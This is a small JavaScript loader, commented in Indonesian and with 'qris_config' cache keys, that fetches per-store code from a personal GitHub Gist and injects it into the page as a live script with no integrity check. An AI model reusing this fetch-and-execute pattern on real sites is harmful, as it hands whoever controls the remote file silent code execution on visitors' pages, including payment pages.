(function() {
  // 1. Deteksi script tag (support async)
  var scriptSrc = document.currentScript ? document.currentScript.src : '';
  if (!scriptSrc) {
    var scripts = document.getElementsByTagName('script');
    for (var i = scripts.length - 1; i >= 0; i--) {
      if (scripts[i].src && scripts[i].src.indexOf('loader.js') !== -1) {
        scriptSrc = scripts[i].src;
        break;
      }
    }
  }
  if (!scriptSrc) return;

  // 2. Ambil parameter store
  var store;
  try {
    store = new URL(scriptSrc).searchParams.get('store');
  } catch(e) { return; }
  if (!store) return;

  // 3. Cache system (5 menit)
  var cacheKey = 'qris_config_' + store;
  var cacheTime = 'qris_config_time_' + store;
  var CACHE_DURATION = 5 * 60 * 1000;

  var cachedConfig = localStorage.getItem(cacheKey);
  var cachedTime = localStorage.getItem(cacheTime);
  
  if (cachedConfig && cachedTime && (Date.now() - parseInt(cachedTime) < CACHE_DURATION)) {
    try {
      executeScript(JSON.parse(cachedConfig), store);
      return;
    } catch(e) {}
  }

  // 4. Fetch config dari Gist
  fetch('https://gist.githubusercontent.com/sensasikerja77/028a62a9b788046d81dac61df710f36c/raw/config.json?t=' + Date.now())
    .then(r => {
      if (!r.ok) throw new Error('HTTP ' + r.status);
      return r.json();
    })
    .then(config => {
      // Simpan ke cache
      try {
        localStorage.setItem(cacheKey, JSON.stringify(config));
        localStorage.setItem(cacheTime, Date.now().toString());
      } catch(e) {}
      
      executeScript(config, store);
    })
    .catch(() => {
      // Fallback ke cache kalau error
      if (cachedConfig) {
        try { executeScript(JSON.parse(cachedConfig), store); } catch(e) {}
      }
    });

  function executeScript(config, store) {
    var storeData = config.stores[store];
    if (!storeData || !storeData.script_options) return;
    
    var activeScript = storeData.script_options[storeData.active_index];
    if (!activeScript || !activeScript.code) return;
    
    // Strip HTML tags (auto-handle script yang masih ada tag <script>)
    var code = activeScript.code
      .replace(/<!--[\s\S]*?-->/g, '')
      .replace(/<script[^>]*>/gi, '')
      .replace(/<\/script>/gi, '')
      .trim();
    
    if (!code) return;
    
    var s = document.createElement('script');
    s.textContent = code;
    document.head.appendChild(s);
  }
})();
